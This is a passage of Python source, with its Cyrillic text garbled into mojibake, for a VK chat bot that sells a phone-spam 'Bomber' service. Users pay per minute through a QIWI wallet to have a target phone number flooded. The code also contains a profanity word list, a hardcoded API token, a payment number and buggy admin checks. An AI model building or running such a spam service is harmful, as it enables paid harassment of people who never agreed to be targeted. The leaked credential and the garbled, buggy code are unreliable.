          '–ø–∏–¥–∞—Ä', '–ø–∏–¥–∞—Äa—Å', '–ø–∏–¥–∞—Ä–∞—Å', '–ø–∏–¥–∞—Ä–∞—Å—ã', '–ø–∏–¥–∞—Ä—ã', '–ø–∏–¥–æ—Ä', '–ø–∏–¥–æ—Ä–∞—Å—ã', '–ø–∏–¥–æ—Ä–∫–∞', '–ø–∏–¥–æ—Ä–æ–∫', '–ø–∏–¥–æ—Ä—ã',
          '–ø–∏–¥—Ä–∞—Å', '–ø–∏–∑–¥–∞', '–ø–∏–∑–¥–∞–Ω—É—Ç—å', '–ø–∏–∑–¥–∞–Ω—É—Ç—å—Å—è', '–ø–∏–∑–¥–∞—Ä–≤–∞–Ω—å—á–∏–∫', '–ø–∏–∑–¥–∞—Ç–æ', '–ø–∏–∑–¥–∞—Ç–æ–µ', '–ø–∏–∑–¥–∞—Ç—ã–π',
          '–ø–∏–∑–¥–µ–Ω–∫–∞', '–ø–∏–∑–¥–µ–Ω—ã—à', '–ø–∏–∑–¥—ë–Ω—ã—à', '–ø–∏–∑–¥–µ—Ç—å', '–ø–∏–∑–¥–µ—Ü', '–ø–∏–∑–¥–∏—Ç', '–ø–∏–∑–¥–∏—Ç—å', '–ø–∏–∑–¥–∏—Ç—å—Å—è', '–ø–∏–∑–¥–∏—à—å',
          '–ø–∏–∑–¥–∏—â–∞', '–ø–∏–∑–¥–∏—â–µ', '–ø–∏–∑–¥–æ–±–æ–ª', '–ø–∏–∑–¥–æ–±–æ–ª—ã', '–ø–∏–∑–¥–æ–±—Ä–∞—Ç–∏—è', '–ø–∏–∑–¥–æ–≤–∞—Ç–∞—è', '–ø–∏–∑–¥–æ–≤–∞—Ç—ã–π', '–ø–∏–∑–¥–æ–ª–∏–∑',
          '–ø–∏–∑–¥–æ–Ω—É—Ç—ã–µ', '–ø–∏–∑–¥–æ—Ä–≤–∞–Ω–µ—Ü', '–ø–∏–∑–¥–æ—Ä–≤–∞–Ω–∫–∞', '–ø–∏–∑–¥–æ—Å—Ç—Ä–∞–¥–∞—Ç–µ–ª—å', '–ø–∏–∑–¥—É', '–ø–∏–∑–¥—É–π', '–ø–∏–∑–¥—É–Ω', '–ø–∏–∑–¥—É–Ω—å—è',
          '–ø–∏–∑–¥—ã', '–ø–∏–∑–¥—é–≥–∞', '–ø–∏–∑–¥—é–∫', '–ø–∏–∑–¥—é–ª–∏–Ω–∞', '–ø–∏–∑–¥—é–ª—è', '–ø–∏–∑–¥—è—Ç', '–ø–∏–∑–¥—è—á–∏—Ç—å', '–ø–∏—Å–±—à–∫–∏', '–ø–∏—Å—å–∫–∞',
          '–ø–∏—Å—å–∫–æ—Å—Ç—Ä–∞–¥–∞—Ç–µ–ª—å', '–ø–∏—Å—é–Ω', '–ø–∏—Å—é—à–∫–∞', '—Ö—É—é', '–ø–æ–¥–≥–æ–≤–Ω—è—Ç—å', '–ø–æ–¥–æ–Ω–∫–∏', '–ø–æ–¥–æ–Ω–æ–∫', '–ø–æ–¥—ä–µ–±–Ω—É—Ç—å',
          '–ø–æ–¥—ä–µ–±–Ω—É—Ç—å—Å—è', '–ø–æ–µ–±–∞—Ç—å', '–ø–æ–µ–±–µ–Ω—å', '–ø–æ—ë–±—ã–≤–∞–∞–µ—Ç', '–ø–æ—Å–∫—É–¥–∞', '–ø–æ—Å—Ä–∞—Ç—å', '–ø–æ—Ç–∞—Å–∫—É—Ö–∞', '–ø–æ—Ç–∞—Å–∫—É—à–∫–∞',
          '–ø–æ—Ö–µ—Ä', '–ø–æ—Ö–µ—Ä–∏–ª', '–ø–æ—Ö–µ—Ä–∏–ª–∞', '–ø–æ—Ö–µ—Ä–∏–ª–∏', '–ø–æ—Ö–µ—Ä—É', '–ø–æ—Ö—Ä–µ–Ω', '–ø–æ—Ö—Ä–µ–Ω—É', '–ø–æ—Ö—É–π', '–ø–æ—Ö—É–∏—Å—Ç',
          '–ø–æ—Ö—É–∏—Å—Ç–∫–∞', '–ø–æ—Ö—É—é', '–ø—Ä–∏–¥—É—Ä–æ–∫', '–ø—Ä–∏–µ–±–∞—Ç—å—Å—è', '–ø—Ä–∏–ø–∏–∑–¥–µ–Ω—å', '–ø—Ä–∏–ø–∏–∑–¥–Ω—É—Ç—ã–π', '–ø—Ä–∏–ø–∏–∑–¥—é–ª–∏–Ω–∞',
          '–ø—Ä–æ–±–∑–¥–µ–ª—Å—è', '–ø—Ä–æ–±–ª—è–¥—å', '–ø—Ä–æ–µ–±', '–ø—Ä–æ–µ–±–∞–Ω–∫–∞', '–ø—Ä–æ–µ–±–∞—Ç—å', '–ø—Ä–æ–º–∞–Ω–¥–µ—Ç—å', '–ø—Ä–æ–º—É–¥–µ—Ç—å', '–ø—Ä–æ–ø–∏–∑–¥–µ–ª—Å—è',
          '–ø—Ä–æ–ø–∏–∑–¥–µ—Ç—å', '–ø—Ä–æ–ø–∏–∑–¥—è—á–∏—Ç—å', '—Ä–∞–∑–¥–æ–ª–±–∞–π', '—Ä–∞–∑—Ö—É—è—á–∏—Ç—å', '—Ä–∞–∑—ä–µ–±', '—Ä–∞–∑—ä–µ–±–∞', '—Ä–∞–∑—ä–µ–±–∞–π', '—Ä–∞–∑—ä–µ–±–∞—Ç—å',
          '—Ä–∞—Å–ø–∏–∑–¥–∞–π', '—Ä–∞—Å–ø–∏–∑–¥–µ—Ç—å—Å—è', '—Ä–∞—Å–ø–∏–∑–¥—è–π', '—Ä–∞—Å–ø–∏–∑–¥—è–π—Å—Ç–≤–æ', '—Ä–∞—Å–ø—Ä–æ–µ—Ç—å', '—Å–≤–æ–ª–æ—Ç–∞', '—Å–≤–æ–ª–æ—á—å', '—Å–≥–æ–≤–Ω—è—Ç—å',
          '—Å–µ–∫–µ–ª—å', '—Å–µ—Ä—É–Ω', '—Å–µ—Ä—å–∫–∞', '—Å–µ—Å—Ç—Ä–æ–µ–±', '—Å–∏–∫–µ–ª—å', '—Å–∏–ª–∞', '—Å–∏—Ä–∞—Ç—å', '—Å–∏—Ä—ã–≤–∞—Ç—å', '—Å–æ—Å–∏', '—Å–ø–∏–∑–¥–µ–ª',
          '—Å–ø–∏–∑–¥–µ—Ç—å', '—Å–ø–∏–∑–¥–∏–ª', '—Å–ø–∏–∑–¥–∏–ª–∞', '—Å–ø–∏–∑–¥–∏–ª–∏', '—Å–ø–∏–∑–¥–∏—Ç', '—Å–ø–∏–∑–¥–∏—Ç—å', '—Å—Ä–∞–∫–∞', '—Å—Ä–∞–∫—É', '—Å—Ä–∞–Ω—ã–π',
          '—Å—Ä–∞–Ω—å–µ', '—Å—Ä–∞—Ç—å', '—Å—Ä—É–Ω', '—Å—Å–∞–∫–∞', '—Å—Å—ã—à—å', '—Å—Ç–µ—Ä–≤–∞', '—Å—Ç—Ä–∞—Ö–æ–ø–∏–∑–¥–∏—â–µ', '—Å—É–∫–∞', '—Å—É–∫–∏', '—Å—É—Ö–æ–¥—Ä–æ—á–∫–∞',
          '—Å—É—á–∞—Ä–∞', '—Å—É—á–∏–π', '—Å—É—á–∫–∞', '—Å—É—á–∫–æ', '—Å—É—á–æ–Ω–æ–∫', '—Å—É—á—å–µ', '—Å—Ü–∞–Ω–∏–µ', '—Å—Ü–∞—Ç—å', '—Å—Ü—É–∫–∞', '—Å—Ü—É–∫–∏', '—Å—Ü—É–∫–æ–Ω–∞—Ö',
          '—Å—Ü—É–ª—å', '—Å—Ü—ã—Ö–∞', '—Å—Ü—ã—à—å', '—Å—ä–µ–±–∞—Ç—å—Å—è', '—Å—ã–∫—É–Ω', '—Ç—Ä–∞—Ö–∞–µ6', '—Ç—Ä–∞—Ö–∞–µ–±', '—Ç—Ä–∞—Ö–∞—ë–±', '—Ç—Ä–∞—Ö–∞—Ç–µ–ª—å', '—É–±–ª—é–¥–æ–∫',
          '—É–µ–±–∞—Ç—å', '—É—ë–±–∏—â–∞', '—É–µ–±–∏—â–µ', '—É—ë–±–∏—â–µ', '—É–µ–±–∏—â–Ω–æ–µ', '—É—ë–±–∏—â–Ω–æ–µ', '—É–µ–±–∫', '—É–µ–±–∫–∏', '—É—ë–±–∫–∏', '—É–µ–±–æ–∫',
          '—É—ë–±–æ–∫', '—É—Ä—é–∫', '—É—Å—Ä–∞—Ç—å—Å—è', '—É—à–ª–µ–ø–æ–∫', '—Ö_—É_—è_—Ä_–∞', '—Öy—ë', '—Öy–π–Ω—è', '—Ö–∞–º–ª–æ', '—Ö–µ—Ä', '—Ö–µ—Ä–Ω—è',
          '—Ö–µ—Ä–æ–≤–∞—Ç–æ', '—Ö–µ—Ä–æ–≤–∏–Ω–∞', '—Ö–µ—Ä–æ–≤—ã–π', '—Ö–∏—Ç—Ä–æ–≤—ã–µ–±–∞–Ω–Ω—ã–π', '—Ö–∏—Ç—Ä–æ–∂–æ–ø—ã–π', '—Ö—Ée–º', '—Ö—É–µ', '—Ö—É—ë', '—Ö—É–µ–≤–∞—Ç–æ',
          '—Ö—É—ë–≤–µ–Ω—å–∫–∏–π', '—Ö—É–µ–≤–∏–Ω–∞', '—Ö—É–µ–≤–æ', '—Ö—É–µ–≤—ã–π', '—Ö—É—ë–≤—ã–π', '—Ö—É–µ–∫', '—Ö—É—ë–∫', '—Ö—É–µ–ª', '—Ö—É–µ–º', '—Ö—É–µ–Ω—á', '—Ö—É–µ–Ω—ã—à',
          '—Ö—É–µ–Ω—å–∫–∏–π', '—Ö—É–µ–ø–ª–µ—Ç', '—Ö—É–µ–ø–ª—ë—Ç', '—Ö—É–µ–ø—Ä–æ–º—ã—à–ª–µ–Ω–Ω–∏–∫', '—Ö—É–µ—Ä–∏–∫', '—Ö—É–µ—Ä—ã–ª–æ', '—Ö—É–µ—Å–æ—Å', '—Ö—É–µ—Å–æ—Å–∫–∞', '—Ö—É–µ—Ç–∞',
          '—Ö—É–µ—Ç–µ–Ω—å', '—Ö—É–µ—é', '—Ö—É–∏', '—Ö—É–π–∫–æ–º', '—Ö—É–π–ª–æ', '—Ö—É–π–Ω—è', '—Ö—É–π—Ä–∏–∫', '—Ö—É–∏—â–µ', '—Ö—É–ª—è', '—Ö—É—é', '—Ö—É—é–ª',
          '—Ö—É—è', '—Ö—É—è–∫', '—Ö—É—è–∫–∞—Ç—å', '—Ö—É—è–∫–Ω—É—Ç—å', '—Ö—É—è—Ä–∞', '—Ö—É—è—Å–µ', '—Ö—É—è—á–∏—Ç—å', '—Ü–µ–ª–∫–∞', '—á–º–æ', '—á–º–æ—à–Ω–∏–∫', '—á–º—ã—Ä—å',
          '—à–∞–ª–∞–≤–∞', '—à–∞–ª–∞–≤–æ–π', '—à–∞—Ä–∞—ë–±–∏—Ç—å—Å—è', '—à–ª—é—Ö–∞', '—à–ª—é—Ö–æ–π', '—à–ª—é—à–∫–∞', '—è–±—ã–≤–∞–µ—Ç']

def mat(message, ids):
    user = authorize.method("users.get", {"user_ids": ids})
    fullname = user[0]['first_name'] + ' ' + user[0]['last_name']
    for word in sp_mat:
        a = 0
        s = 0
        b = a + len(word)
        for i in range(len(message)):
            if s < 1:
                if message[a:b] == word:
                    write_message(ids, f"–ù—É —Ç–∏–ø–∞ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å: \n[https://vk.com/id{ids}|{fullname}] üë§ \n–°–æ–æ–±—â–µ–Ω–∏–µ: {reseived_message} \n–º–∞—Ç–µ—Ä—à–∏–Ω–Ω–∏–∫ –ø–ø—Ü")
                    s += 1
                    break
                else:
                    a += 1
                    b += 1



token = "f6864cd7b57dcb6e0f45ed2e97e82c1c959c3f7e37d6f064af5f53f3509996aed8fc511978c0f42d7beaa"
authorize = vk_api.VkApi(token=token)
longpoll = VkLongPoll(authorize)
admin = 574170405 or 173540024
for event in longpoll.listen():
    if event.type == VkEventType.MESSAGE_NEW and event.to_me:
        try:
            a = open(str(event.user_id) + "c.txt", "r")
            a.close()
        except:
            a = open(str(event.user_id) + "c.txt", "w")
            a.write("1")
            a.close()
        with open(str(event.user_id) + "c.txt", "r") as ca:
            i = ca.read()
            i = int(i)
        try:
            a = open(str(event.user_id) + ".txt", "r")
            a.close()
        except:
            a = open(str(event.user_id) + ".txt", "w")
            a.write("1")
            a.close()
            write_message(event.user_id, '–ù–∞ –≤–∞—à –±–∞–ª–∞–Ω—Å –∑–∞—á–∏—Å–ª–µ–Ω –±–æ–Ω—É—Å: \n1 —Ä—É–± üí∞')
        with open(str(event.user_id) + ".txt", "r") as ba2:
            bal2 = ba2.read()
            bal2 = int(bal2)
        reseived_message = event.text.lower()
        sender = event.user_id
        user = authorize.method("users.get", {"user_ids": event.user_id})  # –≤–º–µ—Å—Ç–æ 1 –ø–æ–¥—Å—Ç–∞–≤–ª—è–µ—Ç–µ –∞–π–¥–∏ –Ω—É–∂–Ω–æ–≥–æ —é–∑–µ—Ä–∞
        name = user[0]['first_name']
        mat(reseived_message, sender)
        if reseived_message == '–Ω–∞—á–∞—Ç—å' and i == 1 \
                or reseived_message == '–Ω–∞—á–∞—Ç—å' and i == 1 \
                or reseived_message == '–ø—Ä–∏–≤–µ—Ç' and i == 1 \
                or reseived_message == '–∫—É' and i == 1 \
                or reseived_message == '—Ö–∞–π' and i == 1 \
                or reseived_message == '–∑–¥—Ä–∞–≤—Å—Ç–≤—É–π—Ç–µ' and i == 1 \
                or reseived_message == 'start' and i == 1 \
                or reseived_message == '–¥–∞—Ä–æ–≤–∞' and i == 1:
            if check(sender) == 0:
                adder(sender)
                try:
                    a = open(str(sender) + ".txt", "r")
                    a.close()
                except:
                    a = open(str(sender) + ".txt", "w")
                    a.write("1")
                    a.close()
                    write_message(sender, '–ù–∞ –≤–∞—à –±–∞–ª–∞–Ω—Å –∑–∞—á–∏—Å–ª–µ–Ω –±–æ–Ω—É—Å: \n1 —Ä—É–± üí∞')
                with open(str(event.user_id) + ".txt", "r") as ba2:
                    bal2 = ba2.read()
                    bal2 = int(bal2)
            write_message(sender, "–ü—Ä–∏–≤–µ—Ç " + name + '! \n–†–∞–¥—ã –≤–∏–¥–µ—Ç—å —Ç–µ–±—è –≤ –Ω–∞—à–µ–π –≥—Ä—É–ø–ø–µ üòä')
            write_message(sender, '–í—ã –≤ –≥–ª–∞–≤–Ω–æ–º –º–µ–Ω—é: \n\n- Bomber \n- –ü–æ–¥–¥–µ—Ä–∂–∫–∞ \n- –ë–∞–ª–∞–Ω—Å \n- –ü–æ–ø–æ–ª–Ω–∏—Ç—å')

        elif reseived_message[0:6] == 'bomber':
            try:
                a = open(str(event.user_id) + "ph.txt", "r")
                a.close()
            except:
                a = open(str(event.user_id) + "ph.txt", "w")
                a.write("1")
                a.close()
            with open(str(event.user_id) + "ph.txt", "r") as cha:
                hi = cha.read()
                hi = int(hi)
            a = open(str(sender) + "c.txt", "w")
            a.write("4")
            a.close()
            with open(str(sender) + "c.txt", "r") as ca:
                i = ca.read()
                i = int(i)
            if hi == 0:
                write_message(sender, '–í–≤–µ–¥–∏—Ç–µ –Ω–æ–º–µ—Ä –∏ –≤—Ä–µ–º—è –¥–µ–π—Å—Ç–≤–∏—è –±–æ–º–±–µ—Ä–∞ (–≤ –º–∏–Ω—É—Ç–∞—Ö): \n–¶–µ–Ω–∞: 1‚ÇΩ = 1–º–∏–Ω üí∞\n–ü—Ä–∏–º–µ—Ä: 79287777777 5')
            else:
                write_message(sender,
                              '–†–µ–∫–æ–º–µ–Ω–¥—É—é –ø—Ä–æ–≤–µ—Ä–∏—Ç—å –±–æ–º–±–µ—Ä –Ω–∞ —Å–µ–±–µ, –¥–ª—è —ç—Ç–æ–≥–æ –º—ã –≤—ã–¥–∞–ª–∏ –í–∞–º 1 —Ä—É–±. ‚ùó \n\n–í–≤–µ–¥–∏—Ç–µ –Ω–æ–º–µ—Ä –∏ –≤—Ä–µ–º—è –¥–µ–π—Å—Ç–≤–∏—è –±–æ–º–±–µ—Ä–∞ (–≤ –º–∏–Ω—É—Ç–∞—Ö): \n–¶–µ–Ω–∞: 1‚ÇΩ = 1–º–∏–Ω üí∞\n–ü—Ä–∏–º–µ—Ä: 79287777777 5')

        elif (reseived_message[0:11])[0:2] == "79" and len(extract_aarg(reseived_message[0:11])) == 11 and i == 4:
            try:
                try:
                    a = open(str(event.user_id) + ".txt", "r")
                    a.close()
                except:
                    a = open(str(event.user_id) + ".txt", "w")
                    a.write("0")
                    a.close()
                with open(str(event.user_id) + ".txt", "r") as ba2:
                    bal2 = ba2.read()
                    bal2 = int(bal2)
                a = open(str(sender) + "c.txt", "w")
                a.write("1")
                a.close()
                with open(str(sender) + "c.txt", "r") as ca:
                    i = ca.read()
                    i = int(i)
                if str(int(extract_arg(reseived_message))) > str(0):
                    mony = str(int(extract_arg(reseived_message)))
                    nomber = str(int(extract_aarg(reseived_message)))
                    if str(bal2) >= str(int(extract_arg(reseived_message))):
                        nom = threading.Thread(target=bomber, args=(nomber, mony, 1, 2))
                        nom.start()
                        a = open(str(sender) + ".txt", "w")
                        a.write(str(int(bal2) - int(extract_arg(reseived_message))))
                        a.close()
                        with open(str(event.user_id) + ".txt", "r") as ba2:
                            bal2 = ba2.read()
                            bal2 = int(bal2)
                        with open(str(event.user_id) + "ph.txt", "r") as cha:
                            hi = cha.read()
                            hi = int(hi)
                        a = open(str(sender) + "ph.txt", "w")
                        a.write('0')
                        a.close()

                        write_message(sender, 'üí£ –°–ø–∞–º –∑–∞–ø—É—â–µ–Ω!')
                    else:
                        a = open(str(sender) + "c.txt", "w")
                        a.write("2")
                        a.close()
                        with open(str(sender) + "c.txt", "r") as ca:
                            i = ca.read()
                            i = int(i)
                        write_message(sender, '–£ –≤–∞—Å –Ω–µ–¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ —Å—Ä–µ–¥—Å—Ç–≤ üòû')
                else:
                    a = open(str(sender) + "c.txt", "w")
                    a.write("2")
                    a.close()
                    with open(str(sender) + "c.txt", "r") as ca:
                        i = ca.read()
                        i = int(i)
                    write_message(sender, '–ë–∞–ª–∞–Ω—Å –º–µ–Ω—å—à–µ 1 —Ä—É–± üí∞')
            except:
                a = open(str(sender) + "c.txt", "w")
                a.write("4")
                a.close()
                with open(str(sender) + "c.txt", "r") as ca:
                    i = ca.read()
                    i = int(i)
                write_message(sender, '–í—ã –Ω–µ —É–∫–∞–∑–∞–ª–∏ –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ –º–∏–Ω—É—Ç –ø–æ—Å–ª–µ –Ω–æ–º–µ—Ä–∞...')
        elif reseived_message[0:5] == '–Ω–∞–∑–∞–¥' and i == 2 or reseived_message[0:5] == '–Ω–∞–∑–∞–¥' and i == 3 or reseived_message[0:5] == '–Ω–∞–∑–∞–¥' and i == 4:
            a = open(str(sender) + "c.txt", "w")
            a.write("1")
            a.close()
            with open(str(sender) + "c.txt", "r") as ca:
                i = ca.read()
                i = int(i)
            write_message(sender, '–í—ã –≤ –≥–ª–∞–≤–Ω–æ–º –º–µ–Ω—é: \n\n- Bomber \n- –ë–∞–ª–∞–Ω—Å \n- –ü–æ–ø–æ–ª–Ω–∏—Ç—å')
        elif reseived_message[0:5] == '–Ω–∞–∑–∞–¥' and i == 5:
            a = open(str(sender) + "c.txt", "w")
            a.write("2")
            a.close()
            with open(str(sender) + "c.txt", "r") as ca:
                i = ca.read()
                i = int(i)
            write_message(sender, '–í—ã–±–µ—Ä–∏ c–ø–æ—Å–æ–± –ø–æ–ø–æ–ª–Ω–µ–Ω–∏—è üí≥')
        elif reseived_message[0:6] == "–±–∞–ª–∞–Ω—Å":
            try:
                a = open(str(event.user_id) + ".txt", "r")
                a.close()
            except:
                a = open(str(event.user_id) + ".txt", "w")
                a.write("1")
                a.close()
                write_message(sender, '–ù–∞ –≤–∞—à –±–∞–ª–∞–Ω—Å –∑–∞—á–∏—Å–ª–µ–Ω –±–æ–Ω—É—Å: \n1 —Ä—É–± üí∞')
            with open(str(event.user_id) + ".txt", "r") as ba2:
                bal2 = ba2.read()
                bal2 = int(bal2)
            with open(str(sender) + "c.txt", "r") as ca:
                i = ca.read()
                i = int(i)
            write_message(sender, "–¢–≤–æ–π –±–∞–ª–∞–Ω—Å: " + str(bal2) + " —Ä—É–± üí∞")

        elif reseived_message[0:9] == '–ø–æ–¥–¥–µ—Ä–∂–∫–∞':
            a = open(str(sender) + "c.txt", "w")
            a.write("3")
            a.close()
            with open(str(sender) + "c.txt", "r") as ca:
                i = ca.read()
                i = int(i)
            write_message(sender, '–í–≤–µ–¥–∏—Ç–µ –≤–∞—à –≤–æ–ø—Ä–æ—Å ü§î\n–ù–∞—à –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä –æ–±—è–∑–∞—Ç–µ–ª—å–Ω–æ –µ–≥–æ —Ä–∞—Å—Å–º–æ—Ç—Ä–∏—Ç üë§')
        elif reseived_message[0:9] == "–ø–æ–ø–æ–ª–Ω–∏—Ç—å" and i != 3:
            a = open(str(sender) + "c.txt", "w")
            a.write("2")
            a.close()
            with open(str(sender) + "c.txt", "r") as ca:
                i = ca.read()
                i = int(i)
            write_message(sender, "–í—ã–±–µ—Ä–∏—Ç–µ —Å–ø–æ—Å–æ–± –æ–ø–ª–∞—Ç—ã")
        elif reseived_message[0:11] == "–æ–ø–ª–∞—Ç–∞ qiwi" and i == 2:
            a = open(str(sender) + "c.txt", "w")
            a.write("5")
            a.close()
            with open(str(sender) + "c.txt", "r") as ca:
                i = ca.read()
                i = int(i)
            write_message(sender, '–ö–æ—à–µ–ª–µ–∫ –¥–ª—è –ø–ª–∞—Ç–µ–∂–∞: +375296551581 \n –ü—Ä–∏–º–µ—á–∞–Ω–∏–µ –∫ –ø–ª–∞—Ç–µ–∂—É: ' + "1" + str(sender) + ' ‚ùó \n\n–¢–∞–∫ –∂–µ –æ–ø–ª–∞—Ç–∏—Ç—å –º–æ–∂–Ω–æ —Å –ø–æ–º–æ—â—å—é –∫–∞—Ä—Ç—ã (–≤—ã–±–∏—Ä–∞–µ—Ç—Å—è –Ω–∞ —Å–∞–π—Ç–µ). \n\n–ü–æ—Å–ª–µ –æ–ø–ª–∞—Ç—ã –Ω–∞ –í–∞—à –±–∞–ª–∞–Ω—Å –±—É–¥–µ—Ç –∑–∞—á–∏—Å–ª–µ–Ω–∞ —Å—É–º–º–∞ –ø–µ—Ä–µ–≤–æ–¥–∞. –û–± —ç—Ç–æ–º –≤–∞—Å —É–≤–µ–¥–æ–º—è—Ç.')
        elif reseived_message[0:4] == '–º–µ–Ω—é':
            a = open(str(sender) + "c.txt", "w")
            a.write("1")
            a.close()
            with open(str(sender) + "c.txt", "r") as ca:
                i = ca.read()
                i = int(i)
            write_message(sender, '–í—ã –≤ –≥–ª–∞–≤–Ω–æ–º –º–µ–Ω—é: \n\n- Bomber \n- –ü–æ–¥–¥–µ—Ä–∂–∫–∞ \n- –ë–∞–ª–∞–Ω—Å \n- –ü–æ–ø–æ–ª–Ω–∏—Ç—å')
        elif reseived_message[0:2] == "—Ñ—Ñ":
            if sender == admin:
                try:
                    id = extract_arg(reseived_message)
                    bal = extract_arg2(reseived_message)
                    a = open(str(id) + ".txt", "r")
                    skoko = a.read()
                    skoko = int(skoko)
                    a.close()
                    a = open(str(id) + ".txt", "w")
                    a.write(str(skoko + int(bal)))
                    a.close()
                    write_message(event.user_id, "–ì–æ—Ç–æ–≤–æ")
                    write_message(str(id), "–ù–∞ –≤–∞—à –±–∞–ª–∞–Ω—Å –∑–∞—á–∏—Å–ª–µ–Ω–æ " + str(bal) + " —Ä—É–±.")
                except:
                    with open(str(event.user_id) + "c.txt", "r") as ca:
                            i = ca.read()
                            i = int(i)
                    write_message(event.user_id, "–í—ã –Ω–µ —É–∫–∞–∑–∞–ª–∏ –∞–π–¥–∏ –∏–ª–∏ —Å—É–º–º—É")
            else:
                with open(str(event.user_id) + "c.txt", "r") as ca:
                            i = ca.read()
                            i = int(i)
                write_message(sender, '–í—ã –Ω–µ —è–≤–ª—è–µ—Ç–µ—Å—å –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–æ–º üë§')
        elif reseived_message[0:8] == "—Ä–∞—Å—Å—ã–ª–∫–∞":
            if sender == admin:
                a = 0
                try:
                    sm = extract_arg(event.text)
                    a = 1
                except:
                    write_message(event.user_id, "–í—ã –Ω–µ —É–∫–∞–∑–∞–ª–∏ —Ç–µ–∫—Å—Ç –¥–ª—è —Ä–∞—Å—Å—ã–ª–∫–∏")
                if a == 1:
                    with open(str(event.user_id) + "c.txt", "r") as ca:
                        i = ca.read()
                        i = int(i)
                    write_message(event.user_id, "–†—Å—Å—ã–ª–∫–∞ –Ω–∞—á–∞–ª–∞—Å—å")
                    sms = event.text[8:]
                    so_ob = sms
                    t = threading.Thread(target=rass, args=(sms, 1, 2, 3))
                    t.start()
            else:
                write_message(sender, '–í—ã –Ω–µ —è–≤–ª—è–µ—Ç–µ—Å—å –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–æ–º üë§')
        else:
            if i == 1:
                write_message(sender, '–Ø —Ç—è –Ω–µ –ø–æ–Ω—è–ª :/')
            elif i == 4:
                write_message(sender, '–í–≤–µ–¥–∏—Ç–µ –Ω–æ–º–µ—Ä –Ω–æ—Ä–º–∞–ª—å–Ω–æ ‚õî')
            elif i == 3:
                a = open(str(sender) + "c.txt", "w")
                a.write("1")
                a.close()
                with open(str(sender) + "c.txt", "r") as ca:
                    i = ca.read()
                    i = int(i)
                user = authorize.method("users.get", {"user_ids": sender})
                fullname = user[0]['first_name'] + ' ' + user[0]['last_name']
                write_message(173540024, f'–¢–µ–±—è –∑–æ–≤—ë—Ç: [https://vk.com/id{sender}|{fullname}] üë§ \n–°–æ–æ–±—â–µ–Ω–∏–µ: {reseived_message} ')
                write_message(sender, '–°–ø–∞—Å–∏–±–æ –∑–∞ –æ–±—Ä–∞—â–µ–Ω–∏–µ. \n–ú–æ–¥–µ—Ä–∞—Ç–æ—Ä –æ—Ç–≤–µ—Ç–∏—Ç –í–∞–º –≤ –±–ª–∏–∂–∞–π—à–µ–µ –≤—Ä–µ–º—è. üë§')
            elif i == 2:
                write_message(sender, '–í—ã–±–µ—Ä–∏ —Å–ø–æ—Å–æ–± –ø–æ–ø–æ–ª–Ω–µ–Ω–∏—è üí≥')
            else:
                write_message(sender, '–Ø —Ç—è –Ω–µ –ø–æ–Ω—è–ª :/')

